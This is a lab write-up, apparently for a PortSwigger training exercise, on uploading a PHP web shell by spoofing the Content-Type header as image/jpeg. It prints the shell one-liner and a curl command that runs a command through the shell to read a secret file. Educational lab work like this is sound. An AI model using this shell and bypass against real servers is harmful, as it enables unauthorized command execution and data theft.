# Web shell upload via Content-Type restriction bypass

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass), you'll learn: Web shell upload via Content-Type restriction bypass! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216002619.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216002637.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216002643.png)

In the previous lab, we found the image upload function is vulnerable.

**Let's upload a normal image file and intercept the request via Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216003207.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216003237.png)

As you can see, we're sending a POST request to `/my-account/avatar`, and **the `Content-Type` is `image/jpeg`.**

**Let's forward that request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216003327.png)

It said that the file has been uploaded.

**Next, we can try to upload a PHP web shell one liner, and intercept the request:**
```php
<?php system($_GET['cmd']); ?>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216003413.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216003434.png)

Now, the `Content-Type` is changed to `application/x-php`.

**But notice what will happened when we forward that request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216003543.png)

That being said, looks like we couldn't upload a web shell?

However, the `Content-Type` can be fully-controlled by the attacker.

**We can just simply change the `Content-Type` from `application/x-php` to `image/jpeg` or `image/png`!**

**Let's do that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216003738.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2/images/Pasted%20image%2020221216003754.png)

Boom! We've successfully uploaded the web shell!

**In the previous lab, we found that the uploaded file lives in `/files/avatar/<filename>`. Let's trigger the web shell and `cat` the `secret`!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2]
└─# curl https://0aae00cf048ad257c40c7f24001d009d.web-security-academy.net/files/avatars/webshell.php --get --data-urlencode "cmd=cat /home/carlos/secret"
cn37DQhyNzu7Z80CzayF9giYekMXdTDC
```

# What we've learned:

1. Web shell upload via Content-Type restriction bypass